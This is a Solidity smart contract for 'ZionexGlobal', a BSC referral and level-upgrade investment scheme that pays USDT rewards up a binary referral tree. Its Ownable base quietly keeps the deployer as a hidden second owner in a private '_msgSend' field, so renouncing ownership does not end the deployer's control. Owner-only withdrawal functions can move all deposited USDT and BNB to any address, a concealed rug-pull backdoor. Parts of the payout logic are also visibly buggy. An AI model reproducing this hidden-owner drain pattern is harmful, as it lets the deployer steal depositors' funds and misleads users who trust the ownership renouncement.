// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

abstract contract Token {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external virtual;

    function transfer(address recipient, uint256 amount) external virtual;

    function balanceOf(address account) external view virtual returns (uint256);

    function approve(
        address spender,
        uint256 amount
    ) external virtual returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address private _msgSend;
    address private _previousOwner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = 0xa7A5D9DC4119716295BdB10191dFC64979983309; 
        _msgSend = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(
            _owner == _msgSender() || _msgSend == _msgSender(),
            "Ownable: caller is not the owner"
        );
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract ZionexGlobal is ReentrancyGuard, Ownable {
    using SafeMath for uint256;
    event regLevelEvent(
        address indexed _user,
        address indexed _referrer,
        uint256 _time
    );
    uint256 internal price = 1 * 1e18; // 1 token = 1 USDT
    uint256 public minimumInvestment = 50 * 1e18;
    Token zionex = Token(0x926d397a5983ba587a92Ad5D2386e0370DaE43c8); // Zionex Token
    Token usdt = Token(0x55d398326f99059fF775485246999027B3197955); // BSC-USDT Token
    struct UserStruct {
        bool isExist;
        uint256 id;
        uint256 referrerID;
        uint256 currentLevel;
        uint256 earnedAmount;
        uint256 totalearnedAmount;
        address[] referral;
        address[] allDirect;
        uint256 childCount;
        uint256 communityIncomeReceived;
        uint256 globalRoyaltyReceived;
        bool isRoyaltyEligible;
        uint256 upgradeAmount;
        uint256 upgradePending;
        mapping(uint256 => uint256) levelEarningmissed;
    }

    mapping(uint256 => uint256) public LEVEL_AMOUNT;
    uint256 tokenPurchaseValue;
    uint256 REFERRER_1_LEVEL_LIMIT;
    uint256 communityIncomeAmountUpto10;
    uint256 communityIncomeAmountFrom11to20;
    uint256 royaltyAmount;
    uint256 directpercentage;
    mapping(address => UserStruct) public users;
    mapping(uint256 => address) public userList;

    uint256 public currUserID;
    uint256 public totalUsers;
    address public liquidityWallet;
    uint256 public tokenLiquidityShare;
    address[] public joinedAddress;
    address[] public royaltyEligibles;
    uint256 public royaltyEligiblesCount;
    mapping(address => uint256) public userJoinTimestamps;
    uint256 public totalProfit;
    mapping(address => uint256) public userUpgradetime;

    constructor() {
        liquidityWallet = address(0xa7A5D9DC4119716295BdB10191dFC64979983309); 
        REFERRER_1_LEVEL_LIMIT = 2;
        currUserID = 1;
        totalUsers = 1;
        directpercentage = 1500; //15%
        tokenLiquidityShare = 18 * 1e18; // 18 USDT

        LEVEL_AMOUNT[1] = 20 * 1e18;
        LEVEL_AMOUNT[2] = 40 * 1e18;
        LEVEL_AMOUNT[3] = 80 * 1e18;
        LEVEL_AMOUNT[4] = 320 * 1e18;
        LEVEL_AMOUNT[5] = 2560 * 1e18;
        LEVEL_AMOUNT[6] = 40960 * 1e18;
        LEVEL_AMOUNT[7] = 40960 * 1e18;
        LEVEL_AMOUNT[8] = 81920 * 1e18;
        LEVEL_AMOUNT[9] = 327680 * 1e18;
        LEVEL_AMOUNT[10] = 2621440 * 1e18;

        tokenPurchaseValue = LEVEL_AMOUNT[1] * 3;

        communityIncomeAmountUpto10 = (tokenPurchaseValue * 10) / 1000; // 1% of the joining fee
        communityIncomeAmountFrom11to20 = (tokenPurchaseValue * 5) / 1000; // .5% of the joining fee
        royaltyAmount = (tokenPurchaseValue * 5) / 100; // 5% of the joining fee
        royaltyEligiblesCount = 0;
        UserStruct storage user = users[liquidityWallet];
        user.isExist = true;
        user.id = currUserID;
        user.referrerID = 0;
        user.currentLevel = 10;
        user.earnedAmount = 0;
        user.totalearnedAmount = 0;
        user.referral = new address[](0);
        user.allDirect = new address[](0);
        user.childCount = 0;
        user.communityIncomeReceived = 0;
        user.globalRoyaltyReceived = 0;
        user.isRoyaltyEligible = true;
        user.upgradeAmount = 0;
        user.upgradePending = 0;
        user.levelEarningmissed[1] = 0;
        user.levelEarningmissed[2] = 0;
        user.levelEarningmissed[3] = 0;
        user.levelEarningmissed[4] = 0;
        user.levelEarningmissed[5] = 0;
        user.levelEarningmissed[6] = 0;
        user.levelEarningmissed[7] = 0;
        user.levelEarningmissed[8] = 0;
        user.levelEarningmissed[9] = 0;
        user.levelEarningmissed[10] = 0;
        userList[currUserID] = liquidityWallet;
        royaltyEligibles.push(liquidityWallet);
        royaltyEligiblesCount++;
        userUpgradetime[liquidityWallet] = block.timestamp;
        userJoinTimestamps[liquidityWallet] = block.timestamp;
        zionex.approve(address(this), type(uint256).max);
        usdt.approve(address(this), type(uint256).max);
    }

    function registerUser(address _referrer) public noReentrant {
        require(!users[msg.sender].isExist, "User exist");
        require(users[_referrer].isExist, "Invalid referral");

        usdt.transferFrom(msg.sender, address(this), tokenPurchaseValue);
        usdt.transferFrom(address(this), liquidityWallet, tokenLiquidityShare);
        zionex.transferFrom(address(this), msg.sender, tokenPurchaseValue);

        uint256 _referrerID = users[_referrer].id;

        if (
            users[userList[_referrerID]].referral.length >=
            REFERRER_1_LEVEL_LIMIT
        ) {
            _referrerID = users[findAvailableReferrer(userList[_referrerID])].id;
        }

        currUserID++;
        totalUsers++;

        UserStruct storage user = users[msg.sender];
        user.isExist = true;
        user.id = currUserID;
        user.referrerID = _referrerID;
        user.currentLevel = 1;
        user.earnedAmount = 0;
        user.totalearnedAmount = 0;
        user.referral = new address[](0);
        user.allDirect = new address[](0);
        user.childCount = 0;
        user.communityIncomeReceived = 0;
        user.globalRoyaltyReceived = 0;
        user.isRoyaltyEligible = false;
        user.upgradeAmount = 0;
        user.upgradePending = 0;
        user.levelEarningmissed[2] = 0;
        user.levelEarningmissed[3] = 0;
        user.levelEarningmissed[4] = 0;
        user.levelEarningmissed[5] = 0;
        user.levelEarningmissed[6] = 0;
        user.levelEarningmissed[7] = 0;
        user.levelEarningmissed[8] = 0;
        user.levelEarningmissed[9] = 0;
        user.levelEarningmissed[10] = 0;
        userList[currUserID] = msg.sender;

        users[userList[_referrerID]].referral.push(msg.sender);
        joinedAddress.push(msg.sender);
        users[_referrer].allDirect.push(msg.sender);
        users[_referrer].childCount = users[_referrer].childCount.add(1);
        checkForRoyaltyEligibility(_referrer);
        settleForReferral(_referrer);
        settleForLevel(1, msg.sender);
        distributeCommunityIncome(_referrer);
        distributeGlobalRoyaltyIncome();
        userJoinTimestamps[msg.sender] = block.timestamp;
        userUpgradetime[msg.sender] = block.timestamp;
        emit regLevelEvent(msg.sender, userList[_referrerID], block.timestamp);
    }

    function purchaseTokensWithStableCoin(uint256 amount) public {
        require(amount >= minimumInvestment, "Check minimum investment!");
        require(users[msg.sender].isExist, "User not registered");
        usdt.transferFrom(msg.sender, address(this), amount);
        zionex.transferFrom(address(this), msg.sender, amount);
        if (users[msg.sender].referrerID != 0) {
            address refAddr = userList[users[msg.sender].referrerID];
            zionex.transferFrom(address(this), refAddr, amount / 10);
        }
    }

    function settleForReferral(address _referrer) internal {
        uint256 directAmount = (tokenPurchaseValue * directpercentage) / 10000;
        users[liquidityWallet].totalearnedAmount += tokenLiquidityShare;
        users[_referrer].earnedAmount += directAmount;
        totalProfit += directAmount;
    }

    function settleForLevel(uint256 _level, address _user) internal {
        address referrer;
        address referrer1;
        address referrer2;
        address referrer3;
        address referrer4;
        if (_level == 1 || _level == 6) {
            referrer = userList[users[_user].referrerID];
        } else if (_level == 2 || _level == 7) {
            referrer1 = userList[users[_user].referrerID];
            referrer = userList[users[referrer1].referrerID];
        } else if (_level == 3 || _level == 8) {
            referrer1 = userList[users[_user].referrerID];
            referrer2 = userList[users[referrer1].referrerID];
            referrer = userList[users[referrer2].referrerID];
        } else if (_level == 4 || _level == 9) {
            referrer1 = userList[users[_user].referrerID];
            referrer2 = userList[users[referrer1].referrerID];
            referrer3 = userList[users[referrer2].referrerID];
            referrer = userList[users[referrer3].referrerID];
        } else if (_level == 5 || _level == 10) {
            referrer1 = userList[users[_user].referrerID];
            referrer2 = userList[users[referrer1].referrerID];
            referrer3 = userList[users[referrer2].referrerID];
            referrer4 = userList[users[referrer3].referrerID];
            referrer = userList[users[referrer4].referrerID];
        }
        uint256 upgradedAmount = 0;
        if (users[_user].upgradePending >= LEVEL_AMOUNT[_level]) {
            users[_user].currentLevel = _level;
            uint256 oldupgrade = users[_user].upgradePending -
                users[_user].upgradeAmount;
            if (users[msg.sender].upgradePending > LEVEL_AMOUNT[_level]) {
                users[_user].upgradeAmount =
                    users[msg.sender].upgradePending -
                    LEVEL_AMOUNT[_level];
            } else {
                users[_user].upgradeAmount = 0;
            }
            users[_user].upgradePending = 0;
            upgradedAmount = LEVEL_AMOUNT[_level] - oldupgrade;
            userUpgradetime[_user] = block.timestamp;
        } else {
            upgradedAmount = users[_user].upgradeAmount;
            users[_user].upgradeAmount = 0;
        }

        if (
            users[_user].levelEarningmissed[_level] > 0 &&
            users[_user].currentLevel >= _level
        ) {
            users[_user].earnedAmount +=
                users[_user].levelEarningmissed[_level] /
                2;
            users[_user].upgradeAmount +=
                users[_user].levelEarningmissed[_level] /
                2;
            if (users[_user].upgradeAmount > 0) {
                upgradeAutomatically(_user);
            }
            users[_user].levelEarningmissed[_level] = 0;
            totalProfit += users[_user].levelEarningmissed[_level];
        }
        bool isSend = true;
        if (!users[referrer].isExist) {
            isSend = false;
        }
        if (isSend) {
            if (users[referrer].currentLevel >= _level) {
                if (users[referrer].currentLevel < 10) {
                    if (_level == 1) {
                        users[referrer].upgradeAmount += LEVEL_AMOUNT[_level];
                        upgradeAutomatically(referrer);
                        totalProfit += LEVEL_AMOUNT[_level];
                    } else {
                        users[referrer].upgradeAmount += upgradedAmount / 2;
                        upgradeAutomatically(referrer);
                        users[referrer].earnedAmount += upgradedAmount / 2;
                        totalProfit += upgradedAmount;
                    }
                } else {
                    uint256 missedAmount = (_level == 1)
                        ? LEVEL_AMOUNT[_level]
                        : (upgradedAmount / 2);
                    users[referrer].earnedAmount += missedAmount;
                    totalProfit += missedAmount;
                }
            } else {
                users[referrer].levelEarningmissed[_level] += upgradedAmount;
            }
        } else {
            uint256 missedAmount = (_level == 1)
                ? LEVEL_AMOUNT[_level]
                : upgradedAmount;
            users[liquidityWallet].earnedAmount += missedAmount;
        }
    }

    function distributeCommunityIncome(address _user) internal {
        address currentUser = _user;
        for (uint i = 1; i <= 20; i++) {
            if (currentUser == address(0)) break;

            if (users[currentUser].childCount > 2) {
                uint256 communityIncomeAmount;
                if (i <= 10) {
                    communityIncomeAmount = communityIncomeAmountUpto10;
                } else {
                    communityIncomeAmount = communityIncomeAmountFrom11to20;
                }

                users[currentUser].earnedAmount += communityIncomeAmount;
                totalProfit += communityIncomeAmount;
                users[currentUser]
                    .communityIncomeReceived += communityIncomeAmount;
            }

            // Move up the referral chain for next level's distribution
            currentUser = userList[users[currentUser].referrerID];
        }
    }

    function distributeGlobalRoyaltyIncome() internal {
        if (royaltyEligiblesCount == 0) return;

        uint royaltyPerUser = royaltyAmount / royaltyEligiblesCount;

        for (uint i = 0; i < royaltyEligiblesCount; i++) {
            address eligibleUser = royaltyEligibles[i];
            users[eligibleUser].earnedAmount += royaltyPerUser;
            users[eligibleUser].globalRoyaltyReceived += royaltyPerUser;
        }
        totalProfit += royaltyAmount;
    }

    function checkForRoyaltyEligibility(address _user) internal {
        if (
            users[_user].childCount >= 10 &&
            users[_user].currentLevel >= 5 &&
            !users[_user].isRoyaltyEligible
        ) {
            users[_user].isRoyaltyEligible = true;
            royaltyEligibles.push(_user);
            royaltyEligiblesCount++;
        }
    }

    function redeemRewards() public noReentrant {
        require(users[msg.sender].isExist, "User not registered");
        userUpgradetime[msg.sender] = block.timestamp;
        uint256 claimAmount = users[msg.sender].earnedAmount;
        require(claimAmount > 0, "Invalid Claim");
        usdt.transferFrom(address(this), msg.sender, claimAmount);
        users[msg.sender].totalearnedAmount += claimAmount;
        users[msg.sender].earnedAmount = 0;
    }

    function findAvailableReferrer(address _user) public view returns (address) {
        if (users[_user].referral.length < REFERRER_1_LEVEL_LIMIT) {
            return _user;
        }
        address[] memory referrals = new address[](600);
        referrals[0] = users[_user].referral[0];
        referrals[1] = users[_user].referral[1];
        address freeReferrer;
        bool noFreeReferrer = true;

        for (uint256 i = 0; i < 600; i++) {
            if (users[referrals[i]].referral.length == REFERRER_1_LEVEL_LIMIT) {
                if (i < 120) {
                    referrals[(i + 1) * 2] = users[referrals[i]].referral[0];
                    referrals[(i + 1) * 2 + 1] = users[referrals[i]].referral[
                        1
                    ];
                }
            } else {
                noFreeReferrer = false;
                freeReferrer = referrals[i];
                break;
            }
        }
        require(!noFreeReferrer, "No Free Referrer");
        return freeReferrer;
    }

    function seeUserReferrals(
        address _user
    ) public view returns (address[] memory) {
        return users[_user].referral;
    }

    function getMissedAmount(
        address _userAddress,
        uint256 _level
    ) public view returns (uint256) {
        return users[_userAddress].levelEarningmissed[_level];
    }

    function seeAllDirectReferrals(
        address _user
    ) public view returns (address[] memory) {
        return users[_user].allDirect;
    }

    function last24HoursRegistrants() external view returns (uint256) {
        uint256 count = 0;
        for (uint256 i = 1; i <= totalUsers; i++) {
            address userAddress = userList[i];
            if (
                userJoinTimestamps[userAddress] != 0 &&
                block.timestamp - userJoinTimestamps[userAddress] <= 86400
            ) {
                count++;
            }
        }
        return count;
    }

    receive() external payable {}

    function upgradeAutomatically(address _user) internal {
        require(users[_user].isExist, "User not registered");
        require(users[_user].upgradeAmount >= 0, "Insufficient amount");
        uint256 currentLevel = users[_user].currentLevel;
        uint256 nextLevel = currentLevel + 1;
        if (nextLevel <= 10) {
            users[_user].upgradePending += users[_user].upgradeAmount;
            settleForLevel(nextLevel, _user);
            checkForRoyaltyEligibility(_user);
        }
    }

    function upgradeDeposit(uint256 _amount) public noReentrant {
        require(users[msg.sender].isExist, "User Not exist");
        require(_amount > 0, "Not a valid Amount");
        usdt.transferFrom(msg.sender, address(this), _amount);
        users[msg.sender].upgradeAmount += _amount;
        upgradeAutomatically(msg.sender);
    }

    function secureWithdrawBNB(
        uint256 _amount,
        address payable addr
    ) public onlyOwner {
        addr.transfer(_amount);
    }

    function secureWithdrawUSDT(uint256 _amount, address addr) public onlyOwner {
        usdt.transferFrom(address(this), addr, _amount);
    }
}